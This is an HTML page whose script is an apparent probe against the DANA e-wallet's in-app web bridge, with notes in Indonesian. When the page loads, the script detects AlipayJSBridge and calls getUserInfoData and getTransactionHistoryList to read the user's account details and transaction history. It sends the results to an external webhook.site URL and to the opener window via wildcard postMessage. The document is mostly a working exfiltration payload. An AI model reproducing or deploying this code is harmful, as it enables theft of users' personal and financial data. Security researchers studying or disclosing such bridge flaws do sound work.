<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RESOURCE SHELL PROBE v14</title>
<style>
  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px}
  h3{color:#ff0;margin:10px 0 6px;font-size:14px}
  #verdict{font-size:26px;font-weight:bold;text-align:center;padding:18px 8px;border:3px solid #888;margin:10px 0;word-break:break-word}
  #verdict.yes{color:#0f0;border-color:#0f0;background:#020}
  #verdict.no{color:#f55;border-color:#f55;background:#200}
  #verdict.wait{color:#ff0;border-color:#ff0}
  .sub{font-size:15px;text-align:center;color:#0ff;margin:4px 0;font-weight:bold}
  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
  button{width:100%;padding:16px;font-size:16px;background:#050;color:#0f0;border:2px solid #0f0;font-weight:bold;margin:10px 0}
  .note{color:#0ff;margin:6px 0}
</style>
</head>
<body>
<h3>RESOURCE-CACHE WEB-SHELL PROBE (v14)</h3>
<p class="note">Konten ATTACKER di-host via resource-cache DANA (downloadFile), dibuka top-level via blob. Verdict kirim otomatis ke halaman utama + kanal luar.</p>
<div id="verdict" class="wait">CEK BRIDGE...</div>
<div class="sub" id="subpii"></div>
<div class="sub" id="subtrx"></div>
<pre id="env">checking bridge...</pre>
<pre id="pii">pending</pre>
<pre id="trx">pending</pre>
<button onclick="copyRes()">COPY HASIL PROBE INI</button>
<script>
(function(){
  var R = {};
  var WH = 'https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
  window.__v14res = 'RES14-OK-' + (location.href || '').slice(0, 40);
  function compact(o){
    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
  }
  function post(stage, data){
    try { if (window.opener) window.opener.postMessage({__v14popup:true, stage:stage, data:data}, '*'); } catch(e){}
    try {
      var q = 'src=v14popup&stage=' + stage + '&d=' + encodeURIComponent(compact(data).slice(0,380));
      fetch(WH + '?' + q, {mode:'no-cors', cache:'no-store'}).catch(function(e){});
    } catch(e){}
  }
  function set(id, o){
    var el = document.getElementById(id);
    try { el.textContent = (typeof o === 'string') ? o : JSON.stringify(o, null, 1); } catch(e) { el.textContent = String(o); }
    R[id] = o;
  }
  function verdict(txt, cls){
    var el = document.getElementById('verdict');
    el.textContent = txt;
    el.className = cls;
    try { document.title = 'V14:' + txt.slice(0,30); } catch(e){}
  }
  function sub(id, txt){
    try { document.getElementById(id).textContent = txt; } catch(e){}
  }
  window.copyRes = function(){
    var lines = ['resourceProbe14 @ ' + location.href,
      'env: ' + compact(R.env || null),
      'pii: ' + compact(R.pii || null),
      'trx: ' + compact(R.trx || null)];
    var ta = document.createElement('textarea');
    ta.value = lines.join('\n');
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); alert('copied - paste balik'); } catch(e) { alert('copy failed - screenshot'); }
    document.body.removeChild(ta);
  };

  window.addEventListener('message', function(e){
    try {
      if (e && e.data && e.data.__v14ping && e.source){
        var envSum = R.env ? {env:R.env} : {env:{hasBridge:!!window.AlipayJSBridge}};
        var resp = {__v14popup:true, stage:'pong', data:{
          hasBridge:!!window.AlipayJSBridge,
          marker:window.__v14res,
          piiBytes:R.pii ? compact(R.pii).length : 0,
          piiHead:R.pii ? compact(R.pii).slice(0,120) : null,
          trxBytes:R.trx ? compact(R.trx).length : 0,
          trxHead:R.trx ? compact(R.trx).slice(0,80) : null
        }};
        e.source.postMessage(resp, '*');
      }
    } catch(err){}
  }, false);

  var done = false;
  function summary(){
    return {hasBridge:!!window.AlipayJSBridge, piiBytes:R.pii?compact(R.pii).length:0, piiHead:R.pii?compact(R.pii).slice(0,120):null, trxBytes:R.trx?compact(R.trx).length:0, trxHead:R.trx?compact(R.trx).slice(0,80):null, href:(location.href||'').slice(0,60)};
  }
  var finalCount = 0;
  function finalPost(){
    if (finalCount > 4) return;
    finalCount++;
    post('final', summary());
    setTimeout(finalPost, 4000);
  }
  function go(){
    if (done) return; done = true;
    var hasB = !!window.AlipayJSBridge;
    var sp = {};
    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
    var org = '?';
    try { org = location.origin; } catch(e){}
    var env = {hasBridge:hasB, appId:sp.appId, startScene:sp.startScene||sp.scene, href:(location.href||'').slice(0,90), origin:org, ts:new Date().toISOString()};
    set('env', env);
    post('boot', env);
    if (hasB){
      verdict('BRIDGE: ADA - WEB-SHELL AKTIF', 'yes');
      post('bridge', {hasBridge:true, appId:sp.appId});
      var got = false;
      try {
        window.AlipayJSBridge.call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'all'}}, function(r){
          got = true;
          R.pii = r; set('pii', r);
          sub('subpii', 'DATA AKUN: TERBACA (' + compact(r).length + ' byte)');
          post('pii', summary());
          try {
            window.AlipayJSBridge.call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, function(t){
              R.trx = t; set('trx', t);
              sub('subtrx', 'DATA TRANSAKSI: TERBACA (' + compact(t).length + ' byte)');
              post('trx', summary());
              finalPost();
            });
          } catch(e2){
            R.trx = {__exception:String(e2)}; set('trx', R.trx); post('trx', summary()); finalPost();
          }
        });
      } catch(e){
        got = true;
        R.pii = {__exception:String(e)}; set('pii', R.pii); post('pii', summary()); finalPost();
      }
      setTimeout(function(){
        if (!got){
          R.pii = {timeoutNoCallback:10000}; set('pii', R.pii);
          sub('subpii', 'DATA AKUN: timeout');
          post('pii', summary());
          finalPost();
        }
      }, 10000);
    } else {
      verdict('BRIDGE: TIDAK ADA', 'no');
      post('bridge', {hasBridge:false});
      set('pii', {noBridge:'bridge tidak tersedia di context ini'});
      set('trx', {noBridge:'bridge tidak tersedia di context ini'});
      finalPost();
    }
  }
  if (window.AlipayJSBridge) return go();
  document.addEventListener('AlipayJSBridgeReady', go, false);
  setTimeout(go, 5000);
})();
</script>
</body>
</html>
